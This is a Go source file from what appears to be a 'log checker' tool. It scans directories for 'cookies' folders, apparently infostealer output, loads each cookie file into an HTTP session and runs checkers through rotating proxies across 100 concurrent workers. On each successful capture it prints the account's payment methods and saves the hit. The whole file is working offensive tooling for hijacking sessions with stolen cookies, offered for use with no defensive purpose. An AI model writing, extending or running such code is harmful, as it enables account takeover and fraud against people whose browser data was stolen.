package checkmylog

import (
	"fmt"
	"io/fs"
	"math/rand"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	// outputPath is the directory to save the successful logs to.
	outputPath = fmt.Sprintf("OUTPUT/%s", time.Now().Format("2006-01-02 15-04-05"))
	// logs is the list of logs to check.
	logs []string
	// attempts is the number of logs that have been checked.
	attempts int
	// success is the number of logs that have been successfully checked.
	success int
)

// Checker is an interface to represent a checker.
type Checker interface {
	// Name returns the name of the checker.
	Name() string
	// URL returns the URL of the checker.
	URL() url.URL
	// Options returns the options of the checker.
	Options() Opts
	// Capture captures the account from the log.
	Capture(Log) (Account, bool)
}

// Check checks the log with the specified checkers.
func (l Log) Check(checkers ...Checker) {
	for _, c := range checkers {
		if !strings.Contains(strings.ToLower(string(l.content)), strings.ToLower(c.URL().Host)) {
			continue
		}
		l.transport.Proxy = nil

		if c.Options().Proxied && len(proxies) > 0 {
			l.transport.Proxy = newTransportWithProxy(proxies[rand.Intn(len(proxies))]).Proxy
		}
		attempts++

		results, ok := c.Capture(l)
		if !ok {
			continue
		}

		success++
		fmt.Println(strings.Join(results.PaymentMethods(), ", "))
		l.saveToFile(c, results)
	}

	l.jar = nil
	l.content = []byte{}
	l.client = nil
}

// CheckLogs checks the logs in the specified path with the specified checkers.
func CheckLogs(path string, checkers ...Checker) (int, int) {
	for _, c := range checkers {
		fmt.Printf("[X] %s\n", c.Name())
		_ = os.MkdirAll(fmt.Sprintf("%s/%s", outputPath, c.Name()), os.ModePerm)
	}

	f := os.DirFS(path)
	err := fs.WalkDir(f, ".", walkLogsFunc(f, path))
	if err != nil {
		fmt.Println(err)
	}

	if success <= 0 {
		_ = os.RemoveAll(outputPath)
	}

	fmt.Printf("Checking %d logs\n", len(logs))

	workers := 100

	logCh := make(chan string)
	var wg sync.WaitGroup

	// Spawn workers
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go worker(logCh, &wg, checkers...)
	}

	// Send logs to the channel for processing
	go func() {
		for _, l := range logs {
			logCh <- l
		}
		close(logCh)
	}()

	// Wait for all workers to finish
	wg.Wait()
	return attempts, success
}

// walkLogsFunc is a function to walk the logs in the specified path.
func walkLogsFunc(f fs.FS, root string) func(path string, d fs.DirEntry, err error) error {
	return func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !d.IsDir() || !strings.EqualFold(d.Name(), "cookies") {
			return nil
		}
		return fs.WalkDir(f, path, func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				return err
			}
			if d.IsDir() {
				return nil
			}
			logs = append(logs, fmt.Sprintf("%s/%s", root, path))
			return nil
		})
	}
}

// worker function to process logs concurrently
func worker(logCh <-chan string, wg *sync.WaitGroup, checkers ...Checker) {
	defer wg.Done()

	for {
		select {
		case log, ok := <-logCh:
			if !ok {
				// logCh is closed
				return
			}
			content, err := os.ReadFile(log)
			if err != nil {
				fmt.Println(err)
				continue
			}

			jar, _ := LoadCookies(string(content))
			l := NewLog(jar, content)
			l.Check(checkers...)
		}
	}
}
